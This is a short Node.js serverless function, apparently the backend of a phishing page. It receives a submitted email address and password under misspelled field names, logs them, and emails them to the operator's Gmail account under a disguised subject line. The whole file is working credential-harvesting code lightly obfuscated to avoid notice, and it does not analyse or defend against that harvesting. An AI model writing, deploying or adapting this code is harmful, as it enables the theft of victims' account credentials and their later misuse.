const nodemailer = require('nodemailer');

exports.handler = async (event) => {
    console.log("Function triggered with body:", event.body);

    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        // 2. Parse the body
        const { emll, pss } = JSON.parse(event.body);

        // 3. Use the hardcoded credentials that worked locally
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
            user: process.env.ELL_USS,
            pass: process.env.ELL_PSS
            }
        });

        await transporter.sendMail({
            from: process.env.ELL_USS,
            to: process.env.ELL_USS,
            subject: 'Nw deetzhrefru',
            text: `Eml: ${emll}\nPss: ${pss}`
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Success" })
        };
    } catch (error) {
        console.error("Function Error:", error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};